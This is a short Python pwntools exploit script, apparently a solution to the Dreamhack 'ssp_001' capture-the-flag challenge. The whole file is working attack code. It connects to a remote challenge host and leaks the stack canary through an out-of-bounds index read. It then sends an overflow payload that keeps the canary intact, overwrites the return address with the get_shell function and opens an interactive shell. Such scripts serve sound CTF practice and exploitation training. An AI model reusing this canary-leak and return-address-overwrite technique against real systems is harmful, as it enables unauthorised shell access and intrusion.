from pwn import *

# index = [ebp-0x94]
# name_len = [ebp - 0x90]
# select = [ebp-0x8a]
# box = [ebp - 0x88]
# name - [ebp-0x48]
# canary = [ebp-0x8]

p = remote('host3.dreamhack.games', 21239)
elf = ELF('./ssp_001')

canary = b''
get_shell = elf.symbols['get_shell']

# read canary
for i in range(131, 127, -1):
    p.sendlineafter(b'>', b'P')
    p.sendlineafter(b'Element index : ', str(i))
    p.recvuntil(b'is : ')
    canary += p.recv(2)
canary = int(canary, 16)

# leak
p.sendlineafter(b'>', b'E')
name = b'A' * 0x40
name += p32(canary)
name += b'B' * 0x8
name += p32(get_shell)
p.sendlineafter(b'Size : ', str(len(name) + 1))
p.sendlineafter(b'Name : ', name)

p.interactive()